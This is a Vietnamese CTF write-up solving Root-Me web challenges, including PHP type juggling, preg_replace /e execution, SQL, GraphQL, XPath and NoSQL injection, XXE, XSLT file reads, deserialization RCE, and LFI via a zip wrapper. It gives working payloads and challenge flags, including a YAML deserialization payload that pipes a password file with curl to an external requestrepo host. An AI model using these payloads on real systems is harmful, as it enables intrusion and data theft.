<p><img src="https://hackmd.io/_uploads/HJnPuURy1l.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Hk9idLCkyx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B1oyYIRk1g.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/BJQWt8RJke.png" alt="image"></p>
<p><a href="https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet">https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet</a></p>
<p>flag: <code>D0n0tTru5tEv0d3B4nK!</code></p>
<h2 id="php---loose-comparison">PHP - Loose Comparison</h2>
<p>như lỗi thì ta đi vào chall luôn</p>
<p><img src="https://hackmd.io/_uploads/BkPONIygJg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B1udNIylkg.png" alt="image"></p>
<p>đối với dạng lỗ hổng như này là phổ biến ở php như ta thấy ta control được s, h</p>
<pre><code>&lt;?php
function gen_secured_random() { // cause random is the way
    $a = rand(1337,2600)*42;
    $b = rand(1879,1955)*42;

    $a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b;

    return $a+$b;
}

function secured_hash_function($plain) { // cause md5 is the best hash ever
    $secured_plain = sanitize_user_input($plain);
    return md5($secured_plain);
}

function sanitize_user_input($input) { // cause someone told me to never trust user input
    $re = '/[^a-zA-Z0-9]/';
    $secured_input = preg_replace($re, &quot;&quot;, $input);
    return $secured_input;
}

if (isset($_GET['source'])) {
    show_source(__FILE__);
    die();
}


require_once &quot;secret.php&quot;;

if (isset($_POST['s']) &amp;&amp; isset($_POST['h'])) {
    $s = sanitize_user_input($_POST['s']);
    $h = secured_hash_function($_POST['h']);
    $r = gen_secured_random();
    if($s != false &amp;&amp; $h != false) {
        if($s.$r == $h) {
            print &quot;Well done! Here is your flag: &quot;.$flag;
        }
        else {
            print &quot;Fail...&quot;;
        }
    }
    else {
        print &quot;&lt;p&gt;Hum ...&lt;/p&gt;&quot;;
    }
}
?&gt;
</code></pre><p>Yêu cầu <code>$s.$r == $h</code> và <code>($s != false &amp;&amp; $h != false)</code> thì ta sẽ nhận được flag</p>
<p>đối với php thì lỗi này là khá tiêu biểu:</p>
<p>bây giờ tra truyền s=0e***************** vì khi mà php xử lí sẽ nghĩ 0e là 0, tiếp theo sau đó, là giá trị của h được md5 vào, nên ta sẽ truyền giá trị sau cho sau khi md5 nó ra 0e******</p>
<p>Kết quả là 0.random == 0 vì kiểu so sánh lose compare trong php</p>
<p>flag: <code>F34R_Th3_L0o5e_C0mP4r15On</code></p>
<h2 id="php---preg_replace">PHP - preg_replace()</h2>
<p>yêu cầu là đọc file flag.php để nhận flag</p>
<p><img src="https://hackmd.io/_uploads/rkDu6Iklyx.png" alt="image"></p>
<p>khi vào trong trang web ta sẽ có một form như trên, tác dụng là ta check regex nó sẽ replace những kí tự match với nó thành một kí tự content ta đưa vào -&gt; có vẻ như ở đây dùng preg_replace và ngôn ngữ được dùng là php</p>
<p><a href="https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4">https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4</a></p>
<p>đây là bài viết giải thích khá chi tiết và đầy đủ về cách khai thác lỗi này</p>
<p><img src="https://hackmd.io/_uploads/ry1b0UJlJg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/BkTZALkxkx.png" alt="image"></p>
<p><code>/?nic3=/W/e&amp;bruh=eval('echo fi'.'le_get_contents(&quot;flag210d9f88fd1db71b947fbdce22871b57.php&quot;);');</code></p>
<p><code>/?nic3=/W/e&amp;bruh=eval('echo implode(&quot;,&quot;,scand'.'ir(&quot;.&quot;));');</code></p>
<p><a href="https://ctftime.org/writeup/26087">https://ctftime.org/writeup/26087</a></p>
<p><img src="https://hackmd.io/_uploads/HJDzkD1gJx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H1OoJDke1e.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/By_2yPyl1g.png" alt="image"></p>
<p>ta quan sát xem nó xử lí như thế nào</p>
<pre><code>&lt;?php
if(isset($_POST['search']) &amp;&amp; isset($_POST['replace']) &amp;&amp; isset($_POST['content'])) {

	$new = preg_replace($_POST['search'], $_POST['replace'], $_POST['content']);
	echo htmlentities($new);
}
?&gt;
</code></pre><p>flag: <code>pr3g_r3pl4c3_3_m0d1f13r_styl3</code></p>
<h2 id="php---type-juggling">PHP - type juggling</h2>
<p>như tiêu đề thì mình sẽ không nói nhiều nữa</p>
<p>bài này khá là đơn giản</p>
<p><img src="https://hackmd.io/_uploads/SJOfMDkxJx.png" alt="image"></p>
<p><a href="https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016">https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016</a></p>
<p><code>password[]=%22%22</code> nếu mà password là một mảng thì khi strcmp 1 array với 1 chuỗi thì trả ra true</p>
<p><img src="https://hackmd.io/_uploads/H1MNQvJxJg.png" alt="image"></p>
<p>còn đối với username thì losse compare nên value là 0 thì bằng chuỗi</p>
<p><code>{&quot;data&quot;:{&quot;login&quot;:0,&quot;password&quot;:[]}}</code></p>
<p><img src="https://hackmd.io/_uploads/Hka87PJeJx.png" alt="image"></p>
<p>flag: <code>DontForgetPHPL00seComp4r1s0n</code></p>
<h2 id="remote-file-inclusion">Remote File Inclusion</h2>
<p>như tên có nó có trường allow url include được bật và tính năng này đã tắt mặc định từ php 5 trở lên nên hiếm khi ta có thể thấy lỗi này</p>
<p><img src="https://hackmd.io/_uploads/Byh8NDyxkl.png" alt="image"></p>
<p>vào trang web ta thấy có chức năng chuyển đổi ngôn ngữ</p>
<p>thử thay đổi tên thì báo lỗi không not found</p>
<p><code>include(có cái nịt_lang.php)</code> có thể thấy server dùng include để thực hiện chuyển đổi ngôn ngữ tùy theo từng trang mà nó include vào và bài này RFI nên mình làm rfi luôn</p>
<p>yêu cầu là <code>Get the PHP source code.</code></p>
<p><img src="https://hackmd.io/_uploads/rksHDvJx1l.png" alt="image"></p>
<p>ok ta sẽ host file php lưu ý là đuôi _lang.php nên để tên file là index_lang.php</p>
<p><img src="https://hackmd.io/_uploads/BkkiPPJekx.png" alt="image"></p>
<p>flag: <code>R3m0t3_iS_r3aL1y_3v1l</code></p>
<h2 id="sql-injection---authentication">SQL injection - Authentication</h2>
<p>des: <code>Retrieve the administrator password</code></p>
<p>như tên thì start chall</p>
<p><img src="https://hackmd.io/_uploads/BkWBuvygkg.png" alt="image"></p>
<p>đơn giản thôi</p>
<p><img src="https://hackmd.io/_uploads/rknK_D1gkg.png" alt="image"></p>
<p>flag: <code>TYsgv75zgtq</code></p>
<h2 id="sql-injection---authentication---gbk">SQL injection - Authentication - GBK</h2>
<p><img src="https://hackmd.io/_uploads/BJWPcvyxkg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H1E7XGbxke.png" alt="image"></p>
<p><code>login=admin%af'or 1=1 -- &amp;password=abc</code></p>
<p><img src="https://hackmd.io/_uploads/rydB7zbgJg.png" alt="image"></p>
<p>flag: <code>iMDaFlag1337!</code></p>
<h2 id="sql-injection---string">SQL injection - String</h2>
<p><img src="https://hackmd.io/_uploads/By-nmzZe1l.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rJNh6Gbxyx.png" alt="image"></p>
<p>ở đây ta có thể thấy luôn bug sqli như đề</p>
<p><img src="https://hackmd.io/_uploads/SJBo-EZgke.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rJKZ6EZlkx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SkEqTEblke.png" alt="image"></p>
<p>flag: <code>c4K04dtIaJsuWdi</code></p>
<h2 id="xslt---code-execution">XSLT - Code execution</h2>
<p><img src="https://hackmd.io/_uploads/H1nMAfZlJx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/BkT-W4We1e.png" alt="image"></p>
<p>Đề bài nói là file .passwd nằm trong 1 thư mục thì có vẻ là ở <code>.6ff3200bee785801f420fba826ffcdee</code></p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot; &gt;
&lt;xsl:template match=&quot;/&quot;&gt;
&lt;xsl:value-of select=&quot;php:function('opendir','./')&quot;/&gt;
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;xsl:value-of select=&quot;php:function('readdir')&quot;/&gt; -
&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;
</code></pre><p><img src="https://hackmd.io/_uploads/H1oBZNZgJx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rJ5D-N-gkl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SkS9ZV-ekx.png" alt="image"></p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot; &gt;
&lt;xsl:template match=&quot;/&quot;&gt;
&lt;xsl:value-of select=&quot;php:function('file_get_contents','./.6ff3200bee785801f420fba826ffcdee/.passwd')&quot;/&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</code></pre><p>flag: <code>X5L7_R0ckS</code></p>
<h2 id="elixir---eex">Elixir - EEx</h2>
<p><img src="https://hackmd.io/_uploads/rkqvTNWlkl.png" alt="image"></p>
<p>bài đề có nhấn mạnh Elixir</p>
<h2 id="jwt---unsecure-key-handling">JWT - Unsecure Key Handling</h2>
<h2 id="ldap-injection---authentication">LDAP injection - Authentication</h2>
<h2 id="node---serialize">Node - Serialize</h2>
<p><img src="https://hackmd.io/_uploads/Sy5oHrWgkg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/ry7-vB-lyx.png" alt="image"></p>
<p>ta có thể thấy ta truyền giá trị vào thì giá trị profile sẽ được gán là ta truyền vào -&gt; sau đó base64 và set cookie, như vậy có thể đoán là lần đăng nhập tiếp theo server sẽ lấy dữ liệu này mục đích ghi nhớ đăng nhập của ta</p>
<p>Với đề bài thì mình searching:</p>
<p><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/Node/#exploit">https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/Node/#exploit</a>
ở đây bug serialize từ module node-serialize thực hiện desererialize dữ liệu.</p>
<p>Ta thử với cookie:</p>
<p><img src="https://hackmd.io/_uploads/BkdfsSbgye.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HJFQjr-xJe.png" alt="image"></p>
<p>quả thật là rce thành công</p>
<p><img src="https://hackmd.io/_uploads/rJ4_iBblJe.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/ryNhiSbxJe.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HJo12SWe1e.png" alt="image"></p>
<p>flag: <code>Y3pS3r0d3c0mp4nY1sB4d!</code></p>
<h2 id="nosql-injection---authentication">NoSQL injection - Authentication</h2>
<p><img src="https://hackmd.io/_uploads/rkBinrWxkl.png" alt="image"></p>
<p>dec: <code>Find the username of the hidden user.</code></p>
<p><img src="https://hackmd.io/_uploads/H1wwXLbeJl.png" alt="image"></p>
<p>flag: <code>nosqli_no_secret_4_you</code></p>
<p>dùng regex để check user khác ngoài admin vì nếu ta login thành công thì hiển thị admin is connected</p>
<h2 id="php---path-truncation">PHP - Path Truncation</h2>
<p>dec: <code>Retrieve an access to the administration’s zone.</code></p>
<p><img src="https://hackmd.io/_uploads/B1A1_IZxkx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rJig_LWgJg.png" alt="image"></p>
<p>Trong phiên bản PHP &lt; 5.3, độ dài tối đa của chuỗi là 4096 ký tự. Nếu nó gặp một chuỗi dài hơn thế, nó sẽ chỉ cần cắt bớt chuỗi đó, xóa bất kỳ ký tự nào sau độ dài tối đa. Đây chính xác là những gì chúng ta muốn để thoát khỏi phần mở rộng tệp của lỗ hổng LFI của chúng ta!</p>
<p><a href="https://jbedelsec.wordpress.com/2018/12/11/exploiting-php-file-truncation-php-5-3/">https://jbedelsec.wordpress.com/2018/12/11/exploiting-php-file-truncation-php-5-3/</a></p>
<p><img src="https://hackmd.io/_uploads/H1CGOLZxJg.png" alt="image"></p>
<p>flag: <code>110V3TrUnC4T10n</code></p>
<h2 id="php---serialization">PHP - Serialization</h2>
<p><img src="https://hackmd.io/_uploads/Bky6dLWeJx.png" alt="image"></p>
<pre><code>&lt;?php
define('INCLUDEOK', true);
session_start();

if(isset($_GET['showsource'])){
    show_source(__FILE__);
    die;
}

/******** AUTHENTICATION *******/
// login / passwords in a PHP array (sha256 for passwords) !
require_once('./passwd.inc.php');


if(!isset($_SESSION['login']) || !$_SESSION['login']) {
    $_SESSION['login'] = &quot;&quot;;
    // form posted ?
    if($_POST['login'] &amp;&amp; $_POST['password']){
        $data['login'] = $_POST['login'];
        $data['password'] = hash('sha256', $_POST['password']);
    }
    // autologin cookie ?
    else if($_COOKIE['autologin']){
        $data = unserialize($_COOKIE['autologin']);
        $autologin = &quot;autologin&quot;;
    }

    // check password !
    if ($data['password'] == $auth[ $data['login'] ] ) {
        $_SESSION['login'] = $data['login'];

        // set cookie for autologin if requested
        if($_POST['autologin'] === &quot;1&quot;){
            setcookie('autologin', serialize($data));
        }
    }
    else {
        // error message
        $message = &quot;Error : $autologin authentication failed !&quot;;
    }
}
/*********************************/
?&gt;
</code></pre><p>Có thể thấy tại đây -&gt; có chức năng login hoặc nếu có cookie ghi nhớ thì nó sẽ được unserialize</p>
<pre><code>&lt;?php

// message ?
if(!empty($message))
    echo &quot;&lt;p&gt;&lt;em&gt;$message&lt;/em&gt;&lt;/p&gt;&quot;;

// admin ?
if($_SESSION['login'] === &quot;superadmin&quot;){
    require_once('admin.inc.php');
}
// user ?
elseif (isset($_SESSION['login']) &amp;&amp; $_SESSION['login'] !== &quot;&quot;){
    require_once('user.inc.php');
}
// not authenticated ? 
else {
?&gt;
</code></pre><p>$_SESSION[&lsquo;login&rsquo;] === &ldquo;superadmin&rdquo; thì có vẻ như hiển thị trang admin</p>
<p><img src="https://hackmd.io/_uploads/Hy7IAUZxyx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HJpn-vZxyg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rJtktqXgyl.png" alt="image"></p>
<pre><code>&lt;?php
$data['login'] = 'superadmin';
$data['password'] = true;

$s = serialize($data);
// $s = 'a:2:{s:5:&quot;login&quot;;s:10:&quot;superadmin&quot;;s:8:&quot;password&quot;;b:1;}';

echo urlencode($s);

// var_dump(unserialize($s));
?&gt;
</code></pre><p><img src="https://hackmd.io/_uploads/BJmaFqXxJl.png" alt="image"></p>
<p>flag: <code>NoUserInputInPHPSerialization!</code></p>
<h2 id="sql-injection---numeric">SQL injection - Numeric</h2>
<p><img src="https://hackmd.io/_uploads/BJmv95mg1e.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B1L_pq7lkg.png" alt="image"></p>
<p>cơ sở dữ liệu là sqlite</p>
<p><img src="https://hackmd.io/_uploads/r1dq6cXxJl.png" alt="image"></p>
<p>flag: <code>aTlkJYLjcbLmue3</code></p>
<h2 id="sql-injection---routed">SQL Injection - Routed</h2>
<p>dec: yêu cầu tương tự như bài ở trên</p>
<p><a href="http://securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html">http://securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html</a></p>
<p><img src="https://hackmd.io/_uploads/SyRXhySekl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HkT71lSeyl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SkT41lHlyx.png" alt="image"></p>
<p>flag: <code>qs89QdAs9A</code></p>
<h2 id="sql-truncation">SQL Truncation</h2>
<p><img src="https://hackmd.io/_uploads/r15wklre1g.png" alt="image"></p>
<p>hint:
<img src="https://hackmd.io/_uploads/Sy8pJgBx1g.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HJyEIxSg1x.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H1zNUxHgyx.png" alt="image"></p>
<p>flag: <code>J41m3Qu4nD54Tr0nc</code></p>
<h2 id="xml-external-entity">XML External Entity</h2>
<p><img src="https://hackmd.io/_uploads/H1Krhzrlyx.png" alt="image"></p>
<p>như đề bài có hint là rss ta nghĩ ngay đến xxe qua rss luôn</p>
<p><img src="https://hackmd.io/_uploads/Sk0w3GSlyx.png" alt="image"></p>
<p>ở đây trang web có chức năng load xml từ url từ xa</p>
<p><img src="https://hackmd.io/_uploads/rkjK2fSgyl.png" alt="image"></p>
<p>ta sẽ tạo xml như này, bình thường thì /etc/passwd bị detect nên ta dùng php://wrapper filter để đọc file</p>
<p><img src="https://hackmd.io/_uploads/ByrV6fBekx.png" alt="image"></p>
<p>Thành công nhận được nội dung file</p>
<pre><code>&lt;?php

echo '&lt;html&gt;';
echo '&lt;header&gt;&lt;title&gt;XXE&lt;/title&gt;&lt;/header&gt;';
echo '&lt;body&gt;';
echo '&lt;h3&gt;&lt;a href=&quot;?action=checker&quot;&gt;checker&lt;/a&gt;&amp;nbsp;|&amp;nbsp;&lt;a href=&quot;?action=auth&quot;&gt;login&lt;/a&gt;&lt;/h3&gt;&lt;hr /&gt;';

if ( ! isset($_GET['action']) ) $_GET['action']=&quot;checker&quot;;

if($_GET['action'] == &quot;checker&quot;){

   libxml_disable_entity_loader(false);
   libxml_use_internal_errors(true);

   echo '&lt;h2&gt;RSS Validity Checker&lt;/h2&gt;
   &lt;form method=&quot;post&quot; action=&quot;index.php&quot;&gt;
   &lt;input type=&quot;text&quot; name=&quot;url&quot; placeholder=&quot;http://host.tld/rss&quot; /&gt;
   &lt;input type=&quot;submit&quot; /&gt;
   &lt;/form&gt;';


    if(isset($_POST[&quot;url&quot;]) &amp;&amp; !(empty($_POST[&quot;url&quot;]))) {
        $url = $_POST[&quot;url&quot;];
        echo &quot;&lt;p&gt;URL : &quot;.htmlentities($url).&quot;&lt;/p&gt;&quot;;
        try {
            $ch = curl_init(&quot;$url&quot;);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0); 
            $inject = curl_exec( $ch );
            curl_close($ch);
            $string = simplexml_load_string($inject, null, LIBXML_NOENT);
            if ( ! is_object($string) || !$string || !($string-&gt;channel) || !($string-&gt;channel-&gt;item)) throw new Exception(&quot;error&quot;); 

            foreach($string-&gt;channel-&gt;item as $row){
                print &quot;&lt;br /&gt;&quot;;
                print &quot;===================================================&quot;;
                print &quot;&lt;br /&gt;&quot;;
                print htmlentities($row-&gt;title);
                print &quot;&lt;br /&gt;&quot;;
                print &quot;===================================================&quot;;
                print &quot;&lt;br /&gt;&quot;;
                print &quot;&lt;h4 style='color: green;'&gt;XML document is valid&lt;/h4&gt;&quot;;
            }
        } catch (Exception $e) {
            print &quot;&lt;h4 style='color: red;'&gt;XML document is not valid&lt;/h4&gt;&quot;;
        }

    }
}

if($_GET['action'] == &quot;auth&quot;){
    echo '&lt;strong&gt;Login&lt;/strong&gt;&lt;br /&gt;&lt;form METHOD=&quot;POST&quot;&gt;
    &lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;
    &lt;br /&gt;
    &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;
    &lt;br /&gt;
    &lt;input type=&quot;submit&quot; /&gt;
    &lt;/form&gt;
    ';
    if(isset($_POST['username'], $_POST['password']) &amp;&amp; !empty($_POST['username']) &amp;&amp; !empty($_POST['password']))
    {
        $user=$_POST[&quot;username&quot;];
        $pass=$_POST[&quot;password&quot;];
        if($user === &quot;admin&quot; &amp;&amp; $pass === &quot;&quot;.file_get_contents(&quot;.passwd&quot;).&quot;&quot;){
            print &quot;Flag: &quot;.file_get_contents(&quot;.passwd&quot;).&quot;&lt;br /&gt;&quot;;
        }

    }

}


echo '&lt;/body&gt;&lt;/html&gt;';
</code></pre><p>ta thấy flag nằm ở .passwd</p>
<p><img src="https://hackmd.io/_uploads/S1znazSg1g.png" alt="image"></p>
<p>flag: <code>c934fed17f1cac3045ddfeca34f332bc</code></p>
<h2 id="xpath-injection---authentication">XPath injection - Authentication</h2>
<p><img src="https://hackmd.io/_uploads/Bk9Ey7rx1l.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Sk58d7BlJe.png" alt="image"></p>
<p>Nhưng mà ở đây ta có thể thấy được là trang có 3 người dùng -&gt; như tiêu đề xpath thì ta đoán được dữ liệu tại đây được lưu vào trong file xml và được truy xuất qua xpath, cũng na ná sqli thôi</p>
<p><img src="https://hackmd.io/_uploads/SJshOQBlkx.png" alt="image"></p>
<p>flag: <code>6FkC67ui8njEepIK5Gr2Kwe</code></p>
<h2 id="yaml---deserialization">Yaml - Deserialization</h2>
<p><img src="https://hackmd.io/_uploads/HJ6D9QBgkx.png" alt="image"></p>
<p><a href="https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization">https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization</a></p>
<p>quan sát thấy phần url có base64 có key là yaml và phần nội dung sau : sẽ được hiển thị trên trang -&gt; đoán là dữ liệu ở đây được load yaml.unsafe</p>
<h3 id="cve-2017-18342">CVE-2017-18342</h3>
<p><a href="https://net-square.com/yaml-deserialization-attack-in-python.html">https://net-square.com/yaml-deserialization-attack-in-python.html</a></p>
<pre><code>import base64
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import subprocess

class Payload(object):
    def __reduce__(self):
        return subprocess.Popen, ('wget http://00br69e7.requestrepo.com')

# Serialize data
deserialized_data = yaml.dump(Payload())

deserialized_data = 'yaml: ' + deserialized_data

# Encode the serialized data to bytes and then encode it using base64
# encoded_data = base64.b64encode(deserialized_data.encode('utf-8'))

# Print base64 encoded result
print(deserialized_data)

</code></pre><p>trông thì nó cơ bản giống với pickle trong python
ở đây ta cần thêm tupler nữa để rce</p>
<p><img src="https://hackmd.io/_uploads/BJbZmrHxkg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/S1JXmSSlyx.png" alt="image"></p>
<pre><code>yaml: !!python/object/apply:subprocess.Popen
- !!python/tuple
 - python
 - -c
 - &quot;__import__('os').system(str(__import__('base64').b64decode('Y2F0IC5wYXNzd2QgfCBjdXJsIC1kIEAtIDAwYnI2OWU3LnJlcXVlc3RyZXBvLmNvbQ==').decode()))&quot;
</code></pre><p><img src="https://hackmd.io/_uploads/rkYHQSrgJx.png" alt="image"></p>
<p>flag: <code>561385a008727f860eda1afb7f8eba76</code></p>
<h2 id="api---broken-access-2">API - Broken Access 2</h2>
<p><img src="https://hackmd.io/_uploads/By0cXHrgkg.png" alt="image"></p>
<p>Bài này là bài nâng cao api swagger mà server có đề cập ở 2 bài trước</p>
<h2 id="graphql---backend-injection">GraphQL - Backend injection</h2>
<pre><code>{
    rocket(id: &quot;0 union select null,(select value from flag limit 1),country,is_active from rockets limit 40,1--&quot;) {
        name
        country
        is_active
    }
}
</code></pre><pre><code>{
    rocket(id: &quot;1 and (SELECT table_name FROM information_schema.tables where table_name like 'flag%' limit 1)='flag'--&quot;) {
        name
        country
        is_active
    }
}
</code></pre><p><img src="https://hackmd.io/_uploads/HyklSbgbkl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HyherZxb1x.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/S1gVS-lZ1e.png" alt="image"></p>
<p>Có cột id và value trong bảng flag</p>
<p><img src="https://hackmd.io/_uploads/ry05IWgb1l.png" alt="image"></p>
<pre><code>{&quot;query&quot;: &quot;{\n    rocket(id: \&quot;1 and (SELECT substring(column_name,§1§,1) FROM information_schema.columns where table_name like 'flag%' limit 2,1)='§f§'--\&quot;) {\n        name\n        country\n        is_active\n    }\n}&quot;}
</code></pre><h2 id="local-file-inclusion---wrappers">Local File Inclusion - Wrappers</h2>
<p>bài lfi hint như tiêu đều -&gt; đi vào trang chính có chức năng upload file chỉ cho phép up file đuôi jpg.</p>
<p>thử qua php filter không được -&gt; nghĩ tới upload file nên mình thử file zip</p>
<pre><code>┌──(l3mnt2010㉿ASUSEXPERTBOOK)-[~/rootme]
└─$ zip a.zip a.php
  adding: a.php (stored 0%)

┌──(l3mnt2010㉿ASUSEXPERTBOOK)-[~/rootme]
└─$ mv payload.zip a.jpg;
mv: cannot stat 'payload.zip': No such file or directory

┌──(l3mnt2010㉿ASUSEXPERTBOOK)-[~/rootme]
└─$ mv a.zip a.jpg;

┌──(l3mnt2010㉿ASUSEXPERTBOOK)-[~/rootme]
└─$ cat a.php
&lt;?php echo file_get_contents('index.php'); ?&gt;

</code></pre><p>thực hiện zip 1 file php và đổi tên thành jpg -&gt; upload thành công</p>
<p>dùng wrapper zip để giải nén file và đồng thời access đến a.php</p>
<p><code>http://challenge01.root-me.org/web-serveur/ch43/index.php?page=zip://tmp/upload/OpcgreZoP.jpg%23a</code> như ta thấy ban đầu include sẽ tự động thêm .php vào file ta truyền vào</p>
<p><img src="https://hackmd.io/_uploads/SyvBd3xWkx.png" alt="image"></p>
<p>Thành công nhận nội dung file php. Do server cấm system nên ta dùng scandir để check các file trong thư mục do trả ra một array nên ta sẽ dùng var_dump để đọc nội dung <code>&lt;?php var_dump(scandir('.')); ?&gt;</code></p>
<p><img src="https://hackmd.io/_uploads/H1XMY2lZye.png" alt="image"></p>
<p>tên file flag là <code>flag-mipkBswUppqwXlq9ZydO.php</code></p>
<p><img src="https://hackmd.io/_uploads/B1X2Y3gZJl.png" alt="image"></p>
<p>flag: <code>lf1-Wr4pp3r_Ph4R_pwn3d</code></p>
<p>ở đây ta để ý thấy đề cập đến phar -&gt; có vẻ dùng phar vẫn được</p>
<h2 id="php---eval">PHP - Eval</h2>
<p>hint: <code>Non-alphanumeric PHP code</code></p>
<p>source:</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;
&lt;body&gt;
 
&lt;h4&gt; PHP Calc &lt;/h4&gt;
 
&lt;form action='index.php' method='post'&gt;
    &lt;input type='text' id='input' name='input' /&gt;
    &lt;input type='submit' /&gt;
&lt;?php
 
if (isset($_POST['input'])) {
    if(!preg_match('/[a-zA-Z`]/', $_POST['input'])){
        print '&lt;fieldset&gt;&lt;legend&gt;Result&lt;/legend&gt;';
        eval('print '.$_POST['input'].&quot;;&quot;);
        print '&lt;/fieldset&gt;';
    }
    else
        echo &quot;&lt;p&gt;Dangerous code detected&lt;/p&gt;&quot;;
}
?&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>như ta thấy ta nhập input nếu kiểm tra input không chứa chữ cái từ a-&gt;z kể cả in hoa và dấu backtick thì thực hiện eval code</p>
<p>Nguồn: <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#perl-like">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#perl-like</a></p>
<pre><code>$_=[];
$_=@&quot;$_&quot;; 
$_=$_['!'=='@']; ;
$___=$_; 
$__ = $_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$___=$__; 
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;
$___.=$__; 
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;
$___.=$__; 
$__ = $_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$___.=$__; 
$__=$_;
++$__;++$__;++$__;++$__; 
$___.=$__; 
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;
$___.=$__;
$__=$_;

$_____ = '';
$__=$_;
